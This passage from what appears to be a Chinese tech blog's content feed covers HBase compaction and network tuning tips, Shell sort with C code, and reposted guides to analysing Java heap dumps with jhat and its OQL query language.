457.8MB/s           = 1118.1MB/sNOuttotal  = NOutwrite + NOutflush + NOutmajor + NOutminor           = 381MB/s + 76.3MB/s  + 12MB/s + 457.8MB/s           = 927.1MB</code></pre><p>当然这是理想情况下的最小开销，有很多种情况，可以导致实际网络开销超过这个理论值，以下情况都会导致实际流量的升高：</p><ol><li>预分区不足或者业务量增长，导致 Region 发生 Split，Split 会导致额外的 Compaction 操作</li><li>分区写入不平均，导致少量 region 不是因为到达了 flushsize 而进行 flush，导致 flush 下来的文件 Size 偏小</li><li>HFile 因为 balance 等原因导致本地化率低，也会导致 compaciton 产生更多的网卡开销</li><li>预分区数目过多，导致全局 memstore 水位高，memstore 没办法到达 flushsize 进行 flush，从而全局都 flush 出比较小的文件</li><li>等等</li></ol><p>有了这个量化分析后，这些不深入展开，简单说几点已经在有赞生产环境得到验证具有实效的优化点：</p><ol><li>业务接入初期，协助业务做 Rowkey 的设计，避免写入热点</li><li>增加 hbase.hstore.compaction.min，增加每次 Compaction 参加的文件数，相当于减少了每条数据整个生命周期经历过的 Compaction 次数</li><li>根据业务稳态的规模，做好预分区，尽量减少 Split 造成的额外开销</li><li>对于读 RT 不敏感的业务，可以设置 hbase.hstore.compaction.max.size 为 4g，尽可能减少过大的文件做 Compaction，因为大文件做 compaction 的 ROI 实在太低</li><li>对于没有多版本并且有 TTL 的数据，可以关闭系统的 MajorCompaction 周期，数据过期采用文件整体过期的方式，消除 MajorCompaction 的系统开销</li><li>对于吞吐大的场景，用户在写入数据的时候就对数据做压缩，减小写路径造成的网络开销，毕竟 WAL 是不能压缩的（压缩功能形同虚设）</li><li>调整 Memstore 的内存比例，保证单机上每个 region 尽可能的分配到 Flushsize 大小的内存，尽可能的 flush 大文件，从而减少后续 Compaction 开销</li></ol><h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>到这里，HBase 的写吞吐场景的资源定量分析和优化的介绍就算结束了，本文基于 HBase1.2.6 版本。对很多 HBase 的细节没有做展开说明，有些地方因为作者认知有限，难免纰漏，欢迎各位同行指出。</p><p>最后打个小广告，有赞大数据团队基础设施团队，主要负责有赞的数据平台（DP），实时计算（Storm，Spark Streaming，Flink），离线计算（HDFS，YARN，HIVE，SPARK SQL），在线存储（HBase），实时 OLAP（Druid）等数个技术产品，欢迎感兴趣的小伙伴联系 <a href="mailto:hefei@youzan.com" target="_blank" rel="noopener">hefei@youzan.com</a>。</p><p>参考文献</p><ol><li>Google BigTable（<a href="https://static.googleusercontent.com/media/research.google.com/en//archive/bigtable-osdi06.pdf）" target="_blank" rel="noopener">https://static.googleusercontent.com/media/research.google.com/en//archive/bigtable-osdi06.pdf）</a></li><li>HBase官方网站（<a href="http://hbase.apache.org/）" target="_blank" rel="noopener">http://hbase.apache.org/）</a></li></ol><p>转载自：<a href="https://mp.weixin.qq.com/s/6N8drI4Z8ucOqJHVjcwtrQ?scene=25#wechat_redirect" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> Hbase </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hbase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>希尔排序</title>
      <link href="/2019/01/15/suan-fa/pai-xu/xi-er-pai-xu/"/>
      <url>/2019/01/15/suan-fa/pai-xu/xi-er-pai-xu/</url>
      
        <content type="html"><![CDATA[<h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><p>　　直接插入排序在在本身数量比较少的时候情况下效率很高，如果待排数的数量很多，其效率不是很理想。</p><p>　　回想一下直接插入排序过程，排序过程中，我们可以设置一条线，左边是排好序的，右边则是一个一个等待排序，如果最小的那个值在最右边，那么排这个最小值的时候，需要将所有元素向右边移动一位。</p><p>　　是否能够减少这样的移位呢？</p><p>　　我们不希望它是一步一步的移动，而是大步大步的移动。希尔排序就被发明出来了，它也是当时打破效率</p><p>O（n2）的算法之一。希尔排序算法通过设置一个间隔，对同样间隔的数的集合进行插入排序，此数集合中的元素</p><p>移位的长度是以间隔的长度为准，这样就实现了大步位移。但是最后需要对元素集合进行一次直接插入排序，所以</p><p>最后的间隔一定是1。</p><p>下面举一个例子：</p><p>第一趟希尔排序，间隔为4</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/05141501-d5ec97bcc98d449fb24d46e267f749a0.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/05141501-d5ec97bcc98d449fb24d46e267f749a0.png" alt="img"></a></p><p>第二趟排序：间隔是2</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/05141602-7ed5d8b09ce04f7b9723cc46e56f00f1.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/05141602-7ed5d8b09ce04f7b9723cc46e56f00f1.png" alt="img"></a></p><p>第三趟 间隔为1，即 直接插入排序法：</p><p>有人问，这个间隔怎么确定，这是个数学难题，至今没有解答。但是通过大量的实验，还是有个经验值。</p><blockquote><p>减小间隔</p><p>​       上面已经演示了以4为初始间隔对包含10个数据项的数组进行排序的情况。对于更大的数组开始的间隔也应该更大。然后间隔不断减小，直到间隔变成1。</p><p>​       举例来说，含有1000个数据项的数组可能先以364为增量，然后以121为增量，以40为增量，以13为增量，以4为增量，最后以 1为增量进行希尔排序。用来形成间隔的数列被称为间隔序列。这里所表示的间隔序列由Knuth提出，此序列是很常用的。数列以逆向形式从1开始，通过递归表达式</p><p>​       h=3*b+1</p><p>​       来产生，初始值为1。</p><p>​     </p><p>​       在排序算法中，首先在一个短小的循环中使用序列的生成公式来计算出最初的间隔。h值最初被赋为1，然后应用公式h=3*h+1生成序列1,4,13,40,121,364，等等。当间隔大于数组大小的时候，这个过程停止。对于一个含有1000个数据项的数组，序列的第七个数字，1093就太大了。因此，使用序列的第六个数字作为最大的数字来开始这个排序过程，作364-增量排序。然后，每完成一次排序全程的外部循环，用前面提供的此公式倒推式来减小间隔：</p><p>​       h=(h-1)/3</p><p>​       这个倒推的公式生成逆置的序列364,121,40,13,4,1。从364开始，以每一个数字作为增量进行排序。当数组用1-增量排序后，算法结束。</p><p>​       希尔排序比插入排序快很多，它是基于什么原因呢？当h值大的时候，数据项每一趟排序需要移动元素的个数很少，但数据项移动的距离很长。这是非常有效率的。当h减小时，每一趟排序需要移动的元素的个数增多，但是此时数据项已经接近于它们排序后最终的位置，这对于插入排序可以更有效率。正是这两种情况的结合才使希尔排序效率那么高。</p><p>​       注意后期的排序过程不撤销前期排序所做的工作。例如，已经完成了以40-增量的排序的数组，在经过以13-增量的排序后仍然保持了以40-增量的排序的结果。如果不是这样的话，希尔排序就无法实现排序的目的。</p></blockquote><blockquote><p>其他间隔序列</p><p>​       选择间隔序列可以称得上是一种魔法。至此只讨论了用公式h=h*3+1生成间隔序列，但是应用其他间隔序列也取得了不同程序的成功，只是一个绝对的条件，就是逐渐减小的间隔最后一定要等于1，因此最后一趟排序是一次普通的插入排序。</p><p>​       在希尔的原稿中，他建议初始的间距为N/2，简单地把每一趟排序分成了两半。因此，对于N=100的数组逐渐减小的间隔序列为50,25,12,6,3,1。这个方法的好处是不需要在不开始排序前为找到初始的间隔而计算序列；而只需要用2整除N。但是，这被证明并不是最好的数列。尽管对于大多数的数据来说这个方法还是比插入排序效果好，但是这种方法有时会使运行时间降到O(N2)，这并不比插入排序的效率更高。</p><p>​       这个方法的一个变形是用2.2而非2来整除每一个间隔。对于N=100的数组来说，会产生序列45,20,9,4,1。这比用2整除显著改善了效果，因为这样避免了某些导致时间复杂度为O(N2)的最坏情况的发生。不论N为何值，都需要一些额外的代码来保证序列的最后取值为1。这产生了和清单中所列的Knuth序列差不多的结果。</p><p>​       递减数列的另一个可能是</p><p>if(h&lt;5)</p><p>​    h=1;</p><p>else</p><p>​    h=(5*h-1)/11;</p><p>​       间隔序列中的数字互质通常被认为很重要：也就是说，除了1之外它们没有公约数。这个约束条件使每一趟排序更有可能保持前一趟排序已排好的效果。希尔最初以N/2为间隔的低效性就是归咎于它没有遵守这个准则。</p><p>​       或许还可以设计出像如上讲述的间隔序列一样好的间隔序列。但是不管这个间隔序列是什么，都应该能够快速地计算，而不会降低算法的执行速度。</p></blockquote><p>这就是希尔算法的思想：</p><p>先将整个待排记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，在对全体进行一次直接插入排序。</p><p>代码：</p><p>因为希尔排序就是有增量的直接插入排序，所以将原先直接插入代码修改一下，把步进长度改为增量即可。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">shellSort</span><span class="token punctuation">(</span>myDataType <span class="token operator">*</span>ary<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>    <span class="token keyword">int</span> increment <span class="token operator">=</span> len<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//增量</span>    myDataType key<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>increment <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//最后在增量为1并且是执行了情况下停止。</span>    <span class="token punctuation">{</span>        increment <span class="token operator">=</span> increment<span class="token operator">/</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//根据公式</span>        <span class="token comment" spellcheck="true">//printf("increment:%d\n",increment);</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span>increment<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//从[0]开始，对相距增量步长的元素集合进行修改。</span>        <span class="token punctuation">{</span>            key <span class="token operator">=</span> ary<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//以下和直接插入排序类似。</span>            j<span class="token operator">=</span>i<span class="token operator">-</span>increment<span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">&lt;</span> ary<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    myDataType temp <span class="token operator">=</span> ary<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                    ary<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">;</span>                    ary<span class="token punctuation">[</span>j<span class="token operator">+</span>increment<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                j<span class="token operator">=</span>j<span class="token operator">-</span>increment<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>完整代码:</p><pre class=" language-java"><code class="language-java">#include <span class="token string">"stdafx.h"</span>typedef <span class="token keyword">int</span> myDataType<span class="token punctuation">;</span>myDataType src_ary<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">prt_ary</span><span class="token punctuation">(</span>myDataType <span class="token operator">*</span>ary<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> len<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" %d "</span><span class="token punctuation">,</span>ary<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">shellSort</span><span class="token punctuation">(</span>myDataType <span class="token operator">*</span>ary<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>    <span class="token keyword">int</span> increment <span class="token operator">=</span> len<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//增量</span>    myDataType key<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>increment <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//最后在增量为1并且是执行了情况下停止。</span>    <span class="token punctuation">{</span>        increment <span class="token operator">=</span> increment<span class="token operator">/</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//根据公式</span>        <span class="token comment" spellcheck="true">//printf("increment:%d\n",increment);</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span>increment<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//从[0]开始，对相距增量步长的元素集合进行修改。</span>        <span class="token punctuation">{</span>            key <span class="token operator">=</span> ary<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//以下和直接插入排序类似。</span>            j<span class="token operator">=</span>i<span class="token operator">-</span>increment<span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">&lt;</span> ary<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    myDataType temp <span class="token operator">=</span> ary<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                    ary<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">;</span>                    ary<span class="token punctuation">[</span>j<span class="token operator">+</span>increment<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                j<span class="token operator">=</span>j<span class="token operator">-</span>increment<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">_tmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> _TCHAR<span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"before sort:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">prt_ary</span><span class="token punctuation">(</span>src_ary<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//bubble_sort(src_ary,10);</span>    <span class="token comment" spellcheck="true">//bubble_sort_modify1(src_ary,10);</span>    <span class="token comment" spellcheck="true">//bubble_sort_opt(src_ary,10);</span>    <span class="token comment" spellcheck="true">//selectionSort(src_ary,10);</span>    <span class="token comment" spellcheck="true">//insertionSort(src_ary,10);</span>    <span class="token function">shellSort</span><span class="token punctuation">(</span>src_ary<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"after sort:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">prt_ary</span><span class="token punctuation">(</span>src_ary<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>结果：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/05152443-3131570b7c5c4ca0b9d603465eeb3a57.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/05152443-3131570b7c5c4ca0b9d603465eeb3a57.png" alt="img"></a></p><p>本文转载自：<a href="https://www.cnblogs.com/jsgnadsj/p/3458054.html" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java命令--jhat命令使用</title>
      <link href="/2019/01/14/chang-yong-gong-ju/java-ming-ling-jhat-ming-ling-shi-yong/"/>
      <url>/2019/01/14/chang-yong-gong-ju/java-ming-ling-jhat-ming-ling-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="Java命令–jhat命令使用"><a href="#Java命令–jhat命令使用" class="headerlink" title="Java命令–jhat命令使用"></a>Java命令–jhat命令使用</h1><p>jhat也是jdk内置的工具之一。主要是用来分析java堆的命令，可以将堆中的对象以html的形式显示出来，包括对象的数量，大小等等，并支持<strong>对象查询语言</strong>。</p><p>使用jmap等方法生成java的堆文件后，使用其进行分析。</p><h2 id="第一步：导出堆"><a href="#第一步：导出堆" class="headerlink" title="第一步：导出堆"></a><strong>第一步：导出堆</strong></h2><p>#jmap -dump:live,file=a.log pid</p><p>除了使用jmap命令，还可以通过以下方式：</p><blockquote><p>1、使用 jconsole 选项通过 HotSpotDiagnosticMXBean 从运行时获得堆转储（生成dump文件）、</p><p>2、虚拟机启动时如果指定了 -XX:+HeapDumpOnOutOfMemoryError 选项, 则在抛出 OutOfMemoryError 时, 会自动执行堆转储。</p><p>3、使用 hprof 命令</p></blockquote><h2 id="第二步：分析堆文件"><a href="#第二步：分析堆文件" class="headerlink" title="第二步：分析堆文件"></a><strong>第二步：分析堆文件</strong></h2><p>#jhat -J-Xmx512M a1.log</p><p>说明：有时dump出来的堆很大，在启动时会报堆空间不足的错误，可加参数：jhat -J-Xmx512m <heap dump="" file="">。这个内存大小可根据自己电脑进行设置。</heap></p><p> <strong>解析Java堆转储文件,并启动一个 web server</strong></p><p><img src="https://images0.cnblogs.com/i/430613/201403/241640214676935.png" alt="img"></p><h2 id="第三步：查看html"><a href="#第三步：查看html" class="headerlink" title="第三步：查看html"></a><strong>第三步：查看html</strong></h2><p><a href="http://ip:7000/" target="_blank" rel="noopener">http://ip:7000/</a></p><p><img src="https://images0.cnblogs.com/i/430613/201403/241641575764906.gif" alt="img"></p><p>对于jhat启动后显示的html页面中功能：<br>（1）显示出堆中所包含的所有的类</p><p><img src="https://images0.cnblogs.com/i/430613/201403/241645053895823.gif" alt="img"></p><p>（2）从根集能引用到的对象</p><p><img src="https://images0.cnblogs.com/i/430613/201403/241645162324215.gif" alt="img"></p><p>（3）显示平台包括的所有类的实例数量</p><p><img src="https://images0.cnblogs.com/i/430613/201403/241646335456629.gif" alt="img"></p><p>（4）堆实例的分布表</p><p><img src="https://images0.cnblogs.com/i/430613/201403/241646499515817.gif" alt="img"></p><p>（5）执行对象查询语句</p><p><strong><img src="https://images0.cnblogs.com/i/430613/201403/241647402792408.gif" alt="img"></strong></p><p>输入内容如：</p><p>#查询长度大于100的字符串<br>select s from java.lang.String s where s.count &gt; 100</p><p>详细的OQL可点击上图的“OQL help”</p><pre><code>jhat中的OQL（对象查询语言） 如果需要根据某些条件来过滤或查询堆的对象，这是可能的，可以在jhat的html页面中执行OQL，来查询符合条件的对象基本语法： select &lt;javascript expression to select&gt;[from [instanceof] &lt;class name&gt; &lt;identifier&gt;][where &lt;javascript boolean expression to filter&gt;]解释： (1)class name是java类的完全限定名，如：java.lang.String, java.util.ArrayList, [C是char数组, [Ljava.io.File是java.io.File[](2)类的完全限定名不足以唯一的辨识一个类，因为不同的ClassLoader载入的相同的类，它们在jvm中是不同类型的(3)instanceof表示也查询某一个类的子类，如果不明确instanceof，则只精确查询class name指定的类(4)from和where子句都是可选的(5)java域表示：obj.field_name；java数组表示：array[index]举例： （1）查询长度大于100的字符串select s from java.lang.String s where s.count &gt; 100（2）查询长度大于256的数组select a from [I a where a.length &gt; 256（3）显示匹配某一正则表达式的字符串select a.value.toString() from java.lang.String s where /java/(s.value.toString())（4）显示所有文件对象的文件路径select file.path.value.toString() from java.io.File file（5）显示所有ClassLoader的类名select classof(cl).name from instanceof java.lang.ClassLoader cl（6）通过引用查询对象select o from instanceof 0xd404d404 obuilt-in对象 -- heap (1)heap.findClass(class name) -- 找到类select heap.findClass(&quot;java.lang.String&quot;).superclass(2)heap.findObject(object id) -- 找到对象select heap.findObject(&quot;0xd404d404&quot;)(3)heap.classes -- 所有类的枚举select heap.classes(4)heap.objects -- 所有对象的枚举select heap.objects(&quot;java.lang.String&quot;)(5)heap.finalizables -- 等待垃圾收集的java对象的枚举(6)heap.livepaths -- 某一对象存活路径select heaplivepaths(s) from java.lang.String s(7)heap.roots -- 堆根集的枚举辨识对象的函数 (1)classof(class name) -- 返回java对象的类对象select classof(cl).name from instanceof java.lang.ClassLoader cl(2)identical(object1,object2) -- 返回是否两个对象是同一个实例select identical(heap.findClass(&quot;java.lang.String&quot;).name, heap.findClass(&quot;java.lang.String&quot;).name)(3)objectid(object) -- 返回对象的idselect objectid(s) from java.lang.String s(4)reachables -- 返回可从对象可到达的对象select reachables(p) from java.util.Properties p -- 查询从Properties对象可到达的对象select reachables(u, &quot;java.net.URL.handler&quot;) from java.net.URL u -- 查询从URL对象可到达的对象，但不包括从URL.handler可到达的对象(5)referrers(object) -- 返回引用某一对象的对象select referrers(s) from java.lang.String s where s.count &gt; 100(6)referees(object) -- 返回某一对象引用的对象select referees(s) from java.lang.String s where s.count &gt; 100(7)refers(object1,object2) -- 返回是否第一个对象引用第二个对象select refers(heap.findObject(&quot;0xd4d4d4d4&quot;),heap.findObject(&quot;0xe4e4e4e4&quot;))(8)root(object) -- 返回是否对象是根集的成员select root(heap.findObject(&quot;0xd4d4d4d4&quot;)) (9)sizeof(object) -- 返回对象的大小select sizeof(o) from [I o(10)toHtml(object) -- 返回对象的html格式select &quot;&lt;b&gt;&quot; + toHtml(o) + &quot;&lt;/b&gt;&quot; from java.lang.Object o(11)选择多值select {name:t.name?t.name.toString():&quot;null&quot;,thread:t} from instanceof java.lang.Thread t数组、迭代器等函数 (1)concat(enumeration1,enumeration2) -- 将数组或枚举进行连接select concat(referrers(p),referrers(p)) from java.util.Properties p(2)contains(array, expression) -- 数组中元素是否满足某表达式select p from java.util.Properties where contains(referres(p), &quot;classof(it).name == &#39;java.lang.Class&#39;&quot;)返回由java.lang.Class引用的java.util.Properties对象built-in变量it -- 当前的迭代元素index -- 当前迭代元素的索引array -- 被迭代的数组(3)count(array, expression) -- 满足某一条件的元素的数量select count(heap.classes(), &quot;/java.io./(it.name)&quot;)(4)filter(array, expression) -- 过滤出满足某一条件的元素select filter(heap.classes(), &quot;/java.io./(it.name)&quot;)(5)length(array) -- 返回数组长度select length(heap.classes())(6)map(array,expression) -- 根据表达式对数组中的元素进行转换映射select map(heap.classes(),&quot;index + &#39;--&gt;&#39; + toHtml(it)&quot;)(7)max(array,expression) -- 最大值, min(array,expression)select max(heap.objects(&quot;java.lang.String&quot;),&quot;lhs.count&gt;rhs.count&quot;)built-in变量lhs -- 左边元素rhs -- 右边元素(8)sort(array,expression) -- 排序select sort(heap.objects(&#39;[C&#39;),&#39;sizeof(lhs)-sizeof(rhs)&#39;)(9)sum(array,expression) -- 求和select sum(heap.objects(&#39;[C&#39;),&#39;sizeof(it)&#39;)(10)toArray(array) -- 返回数组(11)unique(array) -- 唯一化数组</code></pre><p><strong>参考资料：</strong></p><p><a href="http://blog.csdn.net/gtuu0123/article/details/6039474" target="_blank" rel="noopener">http://blog.csdn.net/gtuu0123/article/details/6039474</a></p><p><a href="http://www.cnblogs.com/o-andy-o/archive/2013/06/11/3132316.html" target="_blank" rel="noopener">http://www.cnblogs.com/o-andy-o/archive/2013/06/11/3132316.html</a></p><p>本文转自：<a href="https://www.cnblogs.com/baihuitestsoftware/articles/6406271.html" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发工具 </tag>
            
            <tag> java虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM 对象查询语言(OQL)</title>
      <link href="/2019/01/14/chang-yong-gong-ju/jvm-dui-xiang-cha-xun-yu-yan-oql/"/>
      <url>/2019/01/14/chang-yong-gong-ju/jvm-dui-xiang-cha-xun-yu-yan-oql/</url>
      
        <content type="html"><![CDATA[<h1 id="JVM-对象查询语言-OQL"><a href="#JVM-对象查询语言-OQL" class="headerlink" title="JVM 对象查询语言(OQL)"></a>JVM 对象查询语言(OQL)</h1><p>本文主要翻译自JDK 1.8的JVM监控工具jhat中关于OQL的英文帮助说明。</p><p>可以在jhat 和 jvisualvm 中进行实践。</p><h2 id="OQL（对象查询语言）"><a href="#OQL（对象查询语言）" class="headerlink" title="OQL（对象查询语言）"></a><strong>OQL（对象查询语言）</strong></h2><p>OQL是用于查询Java堆的类SQL查询语言。OQL允许过滤/选择从Java堆中获取的信息。虽然HAT已经支持预定义的查询，例如“显示类X的所有实例”，但OQL增加了更多的灵活性。OQL基于JavaScript表达式语言。</p><p>OQL查询的形式<code></code></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">&lt;</span>JavaScript expression <span class="token keyword">to</span> <span class="token keyword">select</span><span class="token operator">></span><span class="token punctuation">[</span> <span class="token keyword">from</span> <span class="token punctuation">[</span>instanceof<span class="token punctuation">]</span> <span class="token operator">&lt;</span>class name<span class="token operator">></span> <span class="token operator">&lt;</span>identifier<span class="token operator">></span><span class="token punctuation">[</span> <span class="token keyword">where</span> <span class="token operator">&lt;</span>JavaScript <span class="token keyword">boolean</span> expression <span class="token keyword">to</span> filter<span class="token operator">></span> <span class="token punctuation">]</span> <span class="token punctuation">]</span></code></pre><p><strong>解释：</strong><br>(1)class name是java类的完全限定名，如：java.lang.String, java.util.ArrayList, [C是char数组, [Ljava.io.File是java.io.File[]，依此类退<br>(2)类的完全限定名不足以唯一的辨识一个类，因为不同的ClassLoader载入的相同的类，它们在JVM中是不同类型的<br>(3)instanceof表示也查询某一个类的子类，如果不明确instanceof，则只精确查询class name指定的类<br>(4)from和where子句都是可选的<br>(5)可以使用obj.field_name语法访问Java字段，并且可以使用array [index]语法访问数组元素</p><p>OQL示例</p><ul><li><p>查询长度大于等于100的字符串</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> s <span class="token keyword">from</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String s <span class="token keyword">where</span> s<span class="token punctuation">.</span><span class="token keyword">value</span><span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">100</span></code></pre></li><li><p>查询长度大于等于256的int数组</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">a</span> <span class="token keyword">from</span> <span class="token punctuation">[</span>I <span class="token number">a</span> <span class="token keyword">where</span> <span class="token number">a</span><span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">256</span></code></pre></li></ul><p>​        另一种方式：select a from int[] a where a.length &gt;= 256</p><ul><li><p>显示与正则表达式匹配的字符串的内容</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> s<span class="token punctuation">.</span><span class="token keyword">value</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String s <span class="token keyword">where</span> <span class="token operator">/</span>java<span class="token operator">/</span><span class="token punctuation">.</span>test<span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token keyword">value</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li></ul><p>​        /java/ 修改成你的正则表达式，如/^MyClass$/ 就会匹配MyClass这个字符串</p><ul><li><p>显示所有File对象的文件路径</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">file</span><span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token keyword">value</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token keyword">File</span> <span class="token 